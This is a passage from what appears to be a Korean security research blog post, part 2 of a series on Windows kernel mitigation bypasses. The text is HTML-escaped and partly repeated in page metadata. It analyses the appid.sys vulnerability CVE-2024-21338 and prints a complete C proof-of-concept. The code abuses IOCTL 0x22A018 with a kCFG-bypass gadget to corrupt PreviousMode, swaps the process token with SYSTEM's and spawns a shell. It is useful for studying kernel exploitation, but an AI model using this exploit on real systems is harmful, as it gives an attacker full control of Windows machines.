&lt;p&gt;&lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xB354; &amp;#xC788;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E8;, &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xB85C;&amp;#xC9C1;&amp;#xC774; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD560;&amp;#xC218;&amp;#xB85D; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC758;&amp;#xB3C4;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791; &amp;#xC678; &amp;#xB2E4;&amp;#xB978; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA70; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xAC00;&amp;#xB2A5;&amp;#xC131;&amp;#xC774; &amp;#xB192;&amp;#xC544;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xBE44;&amp;#xAD50;&amp;#xC801; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD0C0;&amp;#xAC9F;&amp;#xC73C;&amp;#xB85C; &amp;#xCC3E;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC88B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; CVE-2024-21338 &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; PreviousMode&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xACE0; Token Swapping&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xCD5C;&amp;#xC885; PoC &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; DEVICE_NAME &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;\\\\?\\AppID&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-comment&#34;&gt;// IOCTL 0x22A018&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; {&lt;/span&gt;
	PVOID arg1;
	PVOID objptr;
	PVOID cfgptr;
	PVOID unknown;
} INPUT_BUFFER;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;
_NtDeviceIoControlFile pNtDeviceIoControlFile;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetImageBase&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ModuleName)&lt;/span&gt; &lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetFILE_OBJECT_Address&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID PreviousMode = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID NTOSKRNL_BASE = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&amp;amp;KTHREAD, pid, hThread);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);

	PreviousMode = (UINT64)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;;
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] PreviousMode address: %p\n&amp;quot;&lt;/span&gt;, PreviousMode);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&amp;amp;EPROCESS, pid, hProc);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);

	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);

	NTOSKRNL_BASE = GetImageBase(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ntoskrnl.exe&amp;quot;&lt;/span&gt;);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ntoskrnl.exe base address : %p\n&amp;quot;&lt;/span&gt;, NTOSKRNL_BASE);

	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + &lt;span class=&#34;hljs-number&#34;&gt;0xA01FD0&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// kcfg bypass gadget&lt;/span&gt;
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ExpProfileDelete function address : %p\n&amp;quot;&lt;/span&gt;, ExpProfileDelete);

	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();

	INPUT_BUFFER buffer = { &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, };
	HANDLE dHandle;
	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, CREATE_NEW, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);

	buffer.arg1 = (UINT64)PreviousMode + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;;		
	buffer.objptr = FILE_OBJECT;					
	buffer.cfgptr = &amp;amp;ExpProfileDelete;				
	buffer.unknown = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;							

	IO_STATUS_BLOCK ioStatus;

	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (pNtDeviceIoControlFile(dHandle, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;ioStatus, &lt;span class=&#34;hljs-number&#34;&gt;0x22A018&lt;/span&gt;, &amp;amp;buffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(buffer), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;dwbytes) != NOERROR) {
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NtDeviceIoControlFile Failed, 0x%x\n&amp;quot;&lt;/span&gt;, GetLastError());
	}

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);

	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
	*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);

	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);

	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xC18C;&amp;#xC2A4;&amp;#xCF54;&amp;#xB4DC;: &lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2013.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC6D0;&amp;#xB798; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; &amp;#xAE30;&amp;#xBC95;&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD588;&amp;#xC9C0;&amp;#xB9CC;.. &amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xAE38;&amp;#xC5B4;&amp;#xC9C4; &amp;#xAD00;&amp;#xACC4;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xB0A8;&amp;#xC740; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0; &amp;#xAE30;&amp;#xBC95;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;.. (&amp;#xAD1C;&amp;#xCC2E;&amp;#xC544; &amp;#xB098;&amp;#xD55C;&amp;#xD150; &amp;#xC124; &amp;#xC5F0;&amp;#xD734;&amp;#xAC00; &amp;#xC788;&amp;#xC5B4;)&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; Part 3&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xCC3E;&amp;#xC544;&amp;#xC624;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; :) 2025&amp;#xB144;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC6B0;&amp;#xB9AC; &amp;#xC5F4;&amp;#xC2EC;&amp;#xD788; &amp;#xACF5;&amp;#xBD80;&amp;#xD574;&amp;#xC694;&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (Ko) - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/&#34;&gt;Bypassing Windows Kernel Mitigations: Part1 - Overview&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &amp;#x2190; Now&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xB2EC; Windows Kernel Mitigation&amp;#xC744; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xB294; Part 1&amp;#xC5D0; &amp;#xC774;&amp;#xC5B4; Part 2&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xBD80;&amp;#xD130;&amp;#xB294; kCFG &amp;#xC6B0;&amp;#xD68C;&amp;#xC5D0;  &amp;#xB300;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBCFC;&amp;#xAC74;&amp;#xB370;&amp;#xC694;, 2024&amp;#xB144; 2&amp;#xC6D4;&amp;#xC5D0; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xB358; appid.sys&amp;#xC758; Local Privilege Escalation &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; CVE-2024-21338&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA70; kCFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD558;&amp;#xB294; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; post-exploitation technique&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h2 id=&#34;CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34;&gt;&lt;a href=&#34;#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&#34;&gt;&lt;/a&gt;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD84;&amp;#xC11D; &amp;#xBC0F; exploit&amp;#xC740; Windows 23H2 build 22631.2861 (2023&amp;#xB144; 12&amp;#xC6D4; &amp;#xB204;&amp;#xC801; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xC801;&amp;#xC6A9; &amp;#xBC84;&amp;#xC804;) &amp;#xC5D0;&amp;#xC11C; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CVE-2024-21338 &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC790;&amp;#xCCB4;&amp;#xB294; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;appid.sys &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBC84;&amp;#xAC00; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC628; I/O Reqeust&amp;#xB97C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C;, IOCTL Code&amp;#xAC00; &lt;code&gt;0x22A018&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;AipSmartHashImageFile&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xBC84;&amp;#xD37C;&amp;#xC778; SystemBuffer&amp;#xB97C; &amp;#xD568;&amp;#xAED8; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xC5EC; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AipSmartHashImageFile&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;AppHashComputeFileHashesInternal&lt;/code&gt;, &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xCCB4;&amp;#xC778;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;SystemBuffer+0x16&lt;/code&gt; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC758; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC81C;&amp;#xC5B4; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; SystemBuffer&amp;#xB97C; &amp;#xCEE4;&amp;#xB110; &amp;#xCEE8;&amp;#xD14D;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C;, &amp;#xC720;&amp;#xC800;&amp;#xB294; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xCF5C;&amp;#xBC31; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.(&amp;#xBE68;&amp;#xAC04;&amp;#xC0C9; &amp;#xBC15;&amp;#xC2A4;) &amp;#xAC70;&amp;#xAE30;&amp;#xC5D0;, &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC778; rcx&amp;#xB97C; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;(&amp;#xD30C;&amp;#xB780;&amp;#xC0C9; &amp;#xBC15;&amp;#xC2A4;) &amp;#xAE4C;&amp;#xC9C0; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC8E0;.&lt;/p&gt;
&lt;p&gt;&amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xBD84;&amp;#xC11D; &amp;#xBC0F; PoC&amp;#xB294; &amp;#xC544;&amp;#xB798; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD574;&amp;#xC8FC;&amp;#xC138;&amp;#xC694;!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&#34;&gt;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&#34;&gt;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB410;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xD55C; &amp;#xC258;&amp;#xCF54;&amp;#xB4DC;&amp;#xB098; ROP &amp;#xAC00;&amp;#xC82F; &amp;#xB4F1;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD560; &amp;#xC218;&amp;#xB294; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;a href=&#34;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kCFG-Kernel-Control-Flow-Guard&#34;&gt;part1&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB4EF;&amp;#xC774;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU&amp;#xAC00; Supervisor Mode(ring 0) &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC720;&amp;#xC800;&amp;#xB79C;&amp;#xB4DC;(ring 3)&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xB294; SMEP&lt;/li&gt;
&lt;li&gt;&amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5;&amp;#xC5D0; &amp;#xB4F1;&amp;#xB85D;&amp;#xB41C; &amp;#xCEE4;&amp;#xB110; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC608;&amp;#xC678;&amp;#xB97C; throw&amp;#xD574; &lt;code&gt;KERNEL_SECURITY_CHECK_FAILURE&lt;/code&gt; &amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; kCFG&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC704; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0;&amp;#xC758; mitgation&amp;#xC758; &amp;#xC874;&amp;#xC7AC; &amp;#xB54C;&amp;#xBB38;&amp;#xC774;&amp;#xC8E0;. SMEP&amp;#xC740; bypass &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574; &amp;#xC6B0;&amp;#xD68C;&amp;#xD55C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD574;&amp;#xB3C4; &amp;#xACB0;&amp;#xAD6D; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xCF54;&amp;#xB4DC;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; kCFG&amp;#xC5D0;&amp;#xC11C; &amp;#xB9C9;&amp;#xD600;&amp;#xBC84;&amp;#xB9AC;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Token Swapping&amp;#xC744; &amp;#xD1B5;&amp;#xD55C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC774; &amp;#xC8FC;&amp;#xC694; &amp;#xBAA9;&amp;#xC801;&amp;#xC778; &amp;#xCEE4;&amp;#xB110; Exploit&amp;#xC740; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; &amp;#xC77D;&amp;#xAE30; &amp;#xC4F0;&amp;#xAE30; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xC5BB;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC911;&amp;#xC694;&amp;#xD55C;&amp;#xB370;&amp;#xC694;, kCFG&amp;#xB97C; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xB294; &amp;#xCEE4;&amp;#xB110; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; Full Arbitrary Kernel Read/Write &amp;#xD504;&amp;#xB9AC;&amp;#xBBF8;&amp;#xD2F0;&amp;#xBE0C;&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; Exploit Tech&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PreviousMode&lt;/li&gt;
&lt;li&gt;SeDebugPrigvileges&lt;/li&gt;
